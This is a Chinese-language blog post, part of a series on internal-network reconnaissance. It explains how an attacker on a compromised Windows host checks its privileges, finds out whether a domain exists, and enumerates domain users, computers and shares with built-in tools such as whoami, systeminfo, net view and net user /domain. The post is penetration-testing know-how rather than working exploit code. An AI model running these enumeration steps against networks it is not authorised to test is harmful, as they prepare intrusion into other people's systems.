

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="r1">
  <meta name="keywords" content="">
  
    <meta name="description" content="1.收集域环境的基本信息查询权限1whoami  1、本地普通用户:当前为本机的user用户  2、本地管理员用户:当前为本机的administrator  3、域内用户:当前为域内普通用户  4、域内用户:当前为hack域内的administrator用户  在这四种情况中。   如果当前内网中存在域,那么本地普通用户只能查询本机相关信息,不能查询域内信息.  而本地管理员用户和域内用户可以查询">
<meta property="og:type" content="article">
<meta property="og:title" content="内网信息搜集3-搜集域环境信息">
<meta property="og:url" content="http://example.com/2023/10/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%863-%E6%90%9C%E9%9B%86%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF/index.html">
<meta property="og:site_name" content="r1ckyL&#39;s secret">
<meta property="og:description" content="1.收集域环境的基本信息查询权限1whoami  1、本地普通用户:当前为本机的user用户  2、本地管理员用户:当前为本机的administrator  3、域内用户:当前为域内普通用户  4、域内用户:当前为hack域内的administrator用户  在这四种情况中。   如果当前内网中存在域,那么本地普通用户只能查询本机相关信息,不能查询域内信息.  而本地管理员用户和域内用户可以查询">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/image-20231006202337163.png">
<meta property="og:image" content="http://example.com/img/image-20231006202152713.png">
<meta property="og:image" content="http://example.com/img/image-20231006202440347.png">
<meta property="og:image" content="http://example.com/img/image-20231006202539873.png">
<meta property="og:image" content="http://example.com/img/image-20231006203037766.png">
<meta property="og:image" content="http://example.com/img/image-20231006203319206.png">
<meta property="og:image" content="http://example.com/img/image-20231006203441819.png">
<meta property="og:image" content="http://example.com/img/image-20231006203546030.png">
<meta property="og:image" content="http://example.com/img/image-20231006203636097.png">
<meta property="og:image" content="http://example.com/img/image-20231006204014077.png">
<meta property="og:image" content="http://example.com/img/image-20231006204134350.png">
<meta property="og:image" content="http://example.com/img/image-20231006204338791.png">
<meta property="og:image" content="http://example.com/img/image-20231007095000042.png">
<meta property="og:image" content="http://example.com/img/image-20231007095623235.png">
<meta property="og:image" content="http://example.com/img/image-20231007095637862.png">
<meta property="og:image" content="http://example.com/img/image-20231007104713878.png">
<meta property="og:image" content="http://example.com/img/image-20231007095706446.png">
<meta property="og:image" content="http://example.com/img/image-20231007095939949.png">
<meta property="og:image" content="http://example.com/img/image-20231007101541784.png">
<meta property="og:image" content="http://example.com/img/image-20231007101929047.png">
<meta property="og:image" content="http://example.com/img/image-20231007102532660.png">
<meta property="og:image" content="http://example.com/img/image-20231007104619600.png">
<meta property="og:image" content="http://example.com/img/image-20231007104912481.png">
<meta property="og:image" content="http://example.com/img/image-20231007105005557.png">
<meta property="og:image" content="http://example.com/img/image-20231007105243145.png">
<meta property="og:image" content="http://example.com/img/image-20231007105719426.png">
<meta property="og:image" content="http://example.com/img/image-20231007105946134.png">
<meta property="og:image" content="http://example.com/img/image-20231007110006792.png">
<meta property="og:image" content="http://example.com/img/image-20231007111132686.png">
<meta property="og:image" content="http://example.com/img/image-20231007111253023.png">
<meta property="og:image" content="http://example.com/img/image-20231007111503042.png">
<meta property="og:image" content="http://example.com/img/image-20231007111614338.png">
<meta property="og:image" content="http://example.com/img/image-20231007111644401.png">
<meta property="og:image" content="http://example.com/img/image-20231007145023930.png">
<meta property="og:image" content="http://example.com/img/image-20231007150154499.png">
<meta property="og:image" content="http://example.com/img/image-20231007150231829.png">
<meta property="og:image" content="http://example.com/img/image-20231007151306581.png">
<meta property="og:image" content="http://example.com/img/image-20231007151443777.png">
<meta property="og:image" content="http://example.com/img/image-20231007151614534.png">
<meta property="og:image" content="http://example.com/img/image-20231007151705203.png">
<meta property="og:image" content="http://example.com/img/image-20231007155245879.png">
<meta property="og:image" content="http://example.com/img/image-20231007160021667.png">
<meta property="og:image" content="http://example.com/img/image-20231007160853211.png">
<meta property="og:image" content="http://example.com/img/image-20231007161535330.png">
<meta property="og:image" content="http://example.com/img/image-20231007165949569.png">
<meta property="og:image" content="http://example.com/img/image-20231007170138792.png">
<meta property="og:image" content="http://example.com/img/image-20231007172220116.png">
<meta property="og:image" content="http://example.com/img/image-20231007173051343.png">
<meta property="og:image" content="http://example.com/img/image-20231007173158318.png">
<meta property="og:image" content="http://example.com/img/image-20231007173427268.png">
<meta property="og:image" content="http://example.com/img/image-20231008102536240.png">
<meta property="og:image" content="http://example.com/img/image-20231008103624188.png">
<meta property="og:image" content="http://example.com/img/image-20231008103855355.png">
<meta property="og:image" content="http://example.com/img/image-20231008104006635.png">
<meta property="og:image" content="http://example.com/img/image-20231008104859869.png">
<meta property="og:image" content="http://example.com/img/image-20231008105107650.png">
<meta property="article:published_time" content="2023-10-31T09:39:32.000Z">
<meta property="article:modified_time" content="2023-10-31T09:49:57.942Z">
<meta property="article:author" content="r1">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/image-20231006202337163.png">
  
  
  
  <title>内网信息搜集3-搜集域环境信息 - r1ckyL&#39;s secret</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"VM6iIPhII9dNKYvDTSfaQlfY-MdYXbMMI","app_key":"ji1dPD8DG5BrS1OfKrqzGDUL","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>r1ckyL</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="内网信息搜集3-搜集域环境信息"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-10-31 17:39" pubdate>
          2023年10月31日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          15k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          123 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">内网信息搜集3-搜集域环境信息</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="1-收集域环境的基本信息"><a href="#1-收集域环境的基本信息" class="headerlink" title="1.收集域环境的基本信息"></a>1.收集域环境的基本信息</h2><h3 id="查询权限"><a href="#查询权限" class="headerlink" title="查询权限"></a>查询权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure>

<p>1、本地普通用户:当前为本机的user用户</p>
<p><img src="/img/image-20231006202337163.png" srcset="/img/loading.gif" lazyload alt="image-20231006202337163"></p>
<p>2、本地管理员用户:当前为本机的administrator</p>
<p><img src="/img/image-20231006202152713.png" srcset="/img/loading.gif" lazyload alt="image-20231006202152713"></p>
<p>3、域内用户:当前为域内普通用户</p>
<p><img src="/img/image-20231006202440347.png" srcset="/img/loading.gif" lazyload alt="image-20231006202440347"></p>
<p>4、域内用户:当前为hack域内的administrator用户</p>
<p><img src="/img/image-20231006202539873.png" srcset="/img/loading.gif" lazyload alt="image-20231006202539873"></p>
<p>在这四种情况中。 </p>
<ul>
<li>如果当前内网中存在域,那么<strong>本地普通用户只能查询本机相关信息,不能查询域内信息</strong>. </li>
<li>而<strong>本地管理员用户和域内用户可以查询域内信息</strong>.</li>
</ul>
<p>其原理是:域内的所有查询都是通过域控制器实现的（基于LDAP协议）,而这个查询需要经过权限认证,所以,只有域用户才拥有这个权限;当域用户执行查询命令时,会自动使用Kerberos协议进行认证,无须额外输人账号和密码 </p>
<p>本地管理员Admmistrator权限可以直接提升为Ntauthority或System权限,因此,在域中,除普通用户外,所有的机器都有—个机器用户（用户名是机器名加上”$”）。在本质上,<strong>机器的system用户对应的就是域里面的机器用户所以,使用 System权限可以运行域内的查询命令</strong>。</p>
<img src="/img/image-20231006203037766.png" srcset="/img/loading.gif" lazyload alt="image-20231006203037766" style="zoom:80%;" />

<h3 id="①判断域是否存在"><a href="#①判断域是否存在" class="headerlink" title="①判断域是否存在"></a>①判断域是否存在</h3><p>获得了本机的相关信息后就要判断当前内网中是否存在域，如果当前内网中存在域,就需要判断所控主机是否在域内  下面罗列几种方法。</p>
<h4 id="1-ipconfig-all-命令"><a href="#1-ipconfig-all-命令" class="headerlink" title="1.ipconfig &#x2F;all 命令"></a>1.ipconfig &#x2F;all 命令</h4><p>执行ipconfig &#x2F;all命令,可以查看网关IP地址、DNS的IP地址,域名、本机是否和DNS服务器处于同一网段等信息</p>
<img src="/img/image-20231006203319206.png" srcset="/img/loading.gif" lazyload alt="image-20231006203319206" style="zoom:67%;" />

<p>然后,通过反向解析查询命令nslookup来解析域名的IP地址。用解析得到的IP地址进行对比判断域控制器和DNS服务器是否在同—台服务器上。</p>
<img src="/img/image-20231006203441819.png" srcset="/img/loading.gif" lazyload alt="image-20231006203441819" style="zoom:67%;" />

<h4 id="2-systeminfo"><a href="#2-systeminfo" class="headerlink" title="2.systeminfo"></a>2.systeminfo</h4><p>执行如下命令,”域”即域名,登录服务器”为域控制器  如果域为”WORKGROUP”,表示当前服务器不在域内</p>
<img src="/img/image-20231006203546030.png" srcset="/img/loading.gif" lazyload alt="image-20231006203546030" style="zoom:67%;" />

<h4 id="3-net-config-workstation"><a href="#3-net-config-workstation" class="headerlink" title="3.net config workstation"></a>3.net config workstation</h4><img src="/img/image-20231006203636097.png" srcset="/img/loading.gif" lazyload alt="image-20231006203636097" style="zoom:67%;" />

<h4 id="4-net-time-domain"><a href="#4-net-time-domain" class="headerlink" title="4.net time &#x2F;domain"></a>4.net time &#x2F;domain</h4><p>一般有3种情况：</p>
<p>1.存在域，但当前用户不是域用户（注意，<strong>当本地管理员administrator密码与域管相同时，可能能查询成功</strong>）</p>
<img src="/img/image-20231006204014077.png" srcset="/img/loading.gif" lazyload alt="image-20231006204014077" style="zoom:80%;" />

<p>2.存在域，并且当前用户是域用户（以PC的system用户为例，其相当于域控分配的机器用户）</p>
<img src="/img/image-20231006204134350.png" srcset="/img/loading.gif" lazyload alt="image-20231006204134350" style="zoom:67%;" />

<p>3.当前网络环境为工作组，不存在域</p>
<img src="/img/image-20231006204338791.png" srcset="/img/loading.gif" lazyload alt="image-20231006204338791" style="zoom:67%;" />

<p>确定了当前内网拥有的域,且所控制的主机在域内,就可以进行域内相关信息的收集了。介绍的查询命令在本质上都是通过LDAP协议到域控制器上进行查询的,所以在查询时需要进行权限认证。只有域用户才拥有此权限,本地用户无法运行本节介绍的查询命令( System 权限用户除外。在域中,除普通用户外,所有的机器都有一个机器用户,其用户名为机器名加上 “$”。 System权限用户对应的就是域里面的机器用户,所以System权限用户可以运行相关的查询命令)</p>
<h3 id="net命令详解"><a href="#net命令详解" class="headerlink" title="net命令详解"></a>net命令详解</h3><p>​	NET命令是一个命令行命令，Net命令有很多函数用于实用和核查计算机之间的NetBIOS连接，可以查看我们的管理网络环境、服务、用户、登陆等信息内容；要想获得Net 的HELP可以</p>
<p>(1)在Windows下可以用图形的方式，开始- &gt;帮助-&gt;索引-&gt;输入NET；</p>
<p>(2)在COMMAND下可以用字符方式：NET &#x2F;?或NET或NET HELP取得相应的方法的帮助。 </p>
<p>所有Net命令接受选项&#x2F;yes和&#x2F;no(可缩写为&#x2F;y和&#x2F;n)。</p>
<p><img src="/img/image-20231007095000042.png" srcset="/img/loading.gif" lazyload alt="image-20231007095000042"></p>
<h4 id="net-view"><a href="#net-view" class="headerlink" title="net view"></a>net view</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata">作用：显示域列表、计算机列表或指定计算机的共享资源列表。<br>命令格式：`<span class="hljs-keyword">Net</span> <span class="hljs-keyword">view</span> [\\computername | /domain[:domainname]]`<br>有关参数说明：<br>‐ 键入不带参数的`<span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span>`显示当前域的计算机列表<br>‐ `\\computername` 指定要查看其共享资源的计算机<br>‐ `/domain[:domainname]`指定要查看其可用计算机的域<br>例如：<span class="hljs-keyword">Net</span> <span class="hljs-keyword">view</span> \\GHQ查看GHQ计算机的共享资源列表。<br><span class="hljs-keyword">Net</span> <span class="hljs-keyword">view</span> /domain:XYZ 查看XYZ域中的机器列表<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007095623235.png" srcset="/img/loading.gif" lazyload alt="image-20231007095623235"></p>
<img src="/img/image-20231007095637862.png" srcset="/img/loading.gif" lazyload alt="image-20231007095637862" style="zoom:80%;" />

<p><img src="/img/image-20231007104713878.png" srcset="/img/loading.gif" lazyload alt="image-20231007104713878"></p>
<p><img src="/img/image-20231007095706446.png" srcset="/img/loading.gif" lazyload alt="image-20231007095706446"></p>
<h4 id="net-user"><a href="#net-user" class="headerlink" title="net user"></a>net user</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">作用：添加或更改用户帐号或显示用户帐号信息。<br>命令格式：`Net <span class="hljs-keyword">user</span> [username [<span class="hljs-keyword">password</span> | *] [<span class="hljs-keyword">options</span>]] [/<span class="hljs-keyword">domain</span>]`<br>有关参数说明：<br>‐ 键入不带参数的Net <span class="hljs-keyword">user</span>查看计算机上的用户帐号列表<br>‐ username添加、删除、更改或查看用户帐号名<br>‐ <span class="hljs-keyword">password</span>为用户帐号分配或更改密码<br>‐ 提示输入密码<br>‐ `/<span class="hljs-keyword">domain</span>`在计算机主域的主域控制器中执行操作。<br>该参数仅在Windows NT <span class="hljs-keyword">Server</span> 域成员的 Windows NT Workstation 计算机上可用。默认情况下，Windows NT <span class="hljs-keyword">Server</span> 计算机在主域控制器中执行操作。注意：在计算机主域的主域控制器发生该动作。它可能不是登录域。<br>例如：`Net <span class="hljs-keyword">user</span> ghq123`查看用户GHQ123的信息。<br>net <span class="hljs-keyword">user</span> /<span class="hljs-keyword">domain</span>  查看域中的用户<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007095939949.png" srcset="/img/loading.gif" lazyload alt="image-20231007095939949"></p>
<h4 id="net-use"><a href="#net-use" class="headerlink" title="net use"></a>net use</h4><p>连接计算机或断开计算机与共享资源的连接，或显示计算机的连接信息。</p>
<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs r">命令格式：`Net use [devicename | *] [\\computername\sharename[\volume]] no&#125;]]` password<span class="hljs-operator">|</span><span class="hljs-operator">*</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">[[</span><span class="hljs-operator">/</span>delete<span class="hljs-punctuation">]</span><span class="hljs-operator">|</span> <span class="hljs-punctuation">[</span><span class="hljs-operator">/</span>persistent<span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span>yes <span class="hljs-operator">|</span><br>有关参数说明：<br>‐ 键入不带参数的Net use列出网络连接<br>‐ devicename指定要连接到的资源名称或要断开的设备名称<br>‐ `\\computername\sharename`服务器及共享资源的名称<br>‐ password访问共享资源的密码<br>‐ <span class="hljs-operator">*</span>提示键入密码<br>‐ `/user`指定进行连接的另外一个用户<br>‐ `domainname`指定另一个域<br>‐ `username`指定登录的用户名<br>‐ `/home`将用户连接到其宿主目录<br>‐ `/delete`取消指定网络连接<br>‐ `/persistent`控制永久网络连接的使用。<br>例如：`Net use f: \\GHQ\TEMP` 将<span class="hljs-punctuation">\</span>GHQ<span class="hljs-punctuation">\</span>TEMP目录建立为<span class="hljs-built_in">F</span>盘<br>`Net use f: \GHQ\TEMP` <span class="hljs-operator">/</span>delete 断开连接。<br></code></pre></td></tr></table></figure>

<h4 id="net-time"><a href="#net-time" class="headerlink" title="net time"></a>net time</h4><p>使计算机的时钟与另一台计算机或域的时间同步。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">命令格式：`Net <span class="hljs-type">time</span> [\\computername | /<span class="hljs-keyword">domain</span>[:<span class="hljs-type">name</span>]] [/<span class="hljs-keyword">set</span>]`<br>有关参数说明：<br>‐ `\\computername`要检查或同步的服务器名<br>‐`/<span class="hljs-keyword">domain</span>[:<span class="hljs-type">name</span>]`指定要与其时间同步的域<br>‐ `/<span class="hljs-keyword">set</span>`使本计算机时钟与指定计算机或域的时钟同步。<br></code></pre></td></tr></table></figure>

<h4 id="net-start"><a href="#net-start" class="headerlink" title="net start"></a>net start</h4><p>启动服务，或显示已启动服务的列表</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">命令格式：`<span class="hljs-built_in">Net</span> <span class="hljs-built_in">start</span> service`<br></code></pre></td></tr></table></figure>

<h4 id="net-pause"><a href="#net-pause" class="headerlink" title="net pause"></a>net pause</h4><p>暂停正在运行的服务。</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">命令格式：`Net <span class="hljs-keyword">pause</span> service`<br></code></pre></td></tr></table></figure>

<h4 id="net-continue"><a href="#net-continue" class="headerlink" title="net continue"></a>net continue</h4><p>重新激活挂起的服务。</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">命令格式：`Net <span class="hljs-keyword">continue</span> service`<br></code></pre></td></tr></table></figure>

<h4 id="net-stop"><a href="#net-stop" class="headerlink" title="net stop"></a>net stop</h4><p>停止 Windows NT&#x2F;2000&#x2F;2003 网络服务。</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">命令格式：<span class="hljs-string">`Net stop service`</span><br></code></pre></td></tr></table></figure>

<h4 id="Net-Statistics"><a href="#Net-Statistics" class="headerlink" title="Net Statistics"></a>Net Statistics</h4><p>显示本地工作站或服务器服务的统计记录。</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">命令格式：`Net statistics [workstation | server]`<br>有关参数说明：<br>∙键入不带参数的Net statistics列出其统计信息可用的运行服务<br>∙`workstation`显示本地工作站服务的统计信息<br>∙`server`显示本地服务器服务的统计信息<br>例如：Net statistics server | more显示服务器服务的统计信息。<br></code></pre></td></tr></table></figure>

<h4 id="net-share"><a href="#net-share" class="headerlink" title="net share"></a>net share</h4><p>创建、删除或显示共享资源。</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">命令格式：`Net share sharename=drive:path [/users:number | /unlimited] [/remark:</span><span class="hljs-string">&quot;text&quot;</span>]`<br>有关参数说明：<br>∙ 键入不带参数的Net share显示本地计算机上所有共享资源的信息<br>∙ `sharename`是共享资源的网络名称<br><span class="hljs-title">∙ `drive:</span>path`指定共享目录的绝对路径<br><span class="hljs-title">∙ `/users:</span>number`设置可同时访问共享资源的最大用户数<br>∙ `/unlimited`不限制同时访问共享资源的用户数<br><span class="hljs-title">∙ `/remark:</span><span class="hljs-string">&quot;text &quot;</span>`添加关于资源的注释，注释文字用引号引住<br><span class="hljs-title">例如： `Net share yesky=c:\temp /remark:</span><span class="hljs-string">&quot;my first share&quot;</span>`<br><span class="hljs-title">以yesky为共享名共享C:</span>\temp<br>`Net share yesky /delete`停止共享yesky目录<br></code></pre></td></tr></table></figure>

<h4 id="net-session"><a href="#net-session" class="headerlink" title="net session"></a>net session</h4><p>列出或断开本地计算机和与之连接的客户端的会话。</p>
<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs r">命令格式：`Net session [\\computername] [/delete]`<br>有关参数说明：<br>∙键入不带参数的Net session显示所有与本地计算机的会话的信息。<br>∙`\\computername`标识要列出或断开会话的计算机。<br>∙`/delete`结束与 `\computername` 计算机会话并关闭本次会话期间计算机的所有打开文件。如果省略<br>`\computername` 参数，将取消与本地计算机的所有会话。<br>例如：`Net session [url=file://\\GHQ]\\GHQ[/url]`要显示计算机名为GHQ的客户端会话信息列表。<br></code></pre></td></tr></table></figure>

<h4 id="net-send"><a href="#net-send" class="headerlink" title="net send"></a>net send</h4><p>向网络的其他用户、计算机或通信名发送消息。</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">命令格式：`Net send &#123;name | * | /domain[:</span>name] | /users&#125; message`<br>有关参数说明：<br>∙`name`要接收发送消息的用户名、计算机名或通信名<br>∙* 将消息发送到组中所有名称<br><span class="hljs-title">∙`/domain[:</span>name]`将消息发送到计算机域中的所有名称<br>∙`/users`将消息发送到与服务器连接的所有用户<br>∙`message`作为消息发送的文本<br>例如：`Net send /users server will shutdown in <span class="hljs-number">10</span> minutes`.给所有连接到服务器的用户发送消息。<br></code></pre></td></tr></table></figure>

<h4 id="net-print"><a href="#net-print" class="headerlink" title="net print"></a>net print</h4><p>显示或控制打印作业及打印队列。</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">命令格式：`Net print [\\computername ] job# [/hold | /release | /delete]`<br>有关参数说明：<br>∙`computername`共享打印机队列的计算机名<br>∙`sharename`打印队列名称<br>∙`job#`在打印机队列中分配给打印作业的标识号<br>∙`/hold`使用`job#`时，在打印机队列中使打印作业等待<br>∙`/release`释放保留的打印作业<br>∙`/delete`从打印机队列中删除打印作业<br><span class="hljs-title">例如：`Net print \\GHQ\HP8000列出[url=file:</span>//\\GHQ]\\GHQ[/url]`计算机上HP8000打印机队列的目录。<br></code></pre></td></tr></table></figure>

<h4 id="net-name"><a href="#net-name" class="headerlink" title="net name"></a>net name</h4><p>添加或删除消息名（有时也称别名），或显示计算机接收消息的名称列表。</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">命令格式：`Net name [name [/add | /delete]]`<br>有关参数说明：<br>∙键入不带参数的Net name列出当前使用的名称<br>∙`name`指定接收消息的名称<br>∙`/add`将名称添加到计算机中<br>∙`/delete`从计算机中删除名称<br></code></pre></td></tr></table></figure>

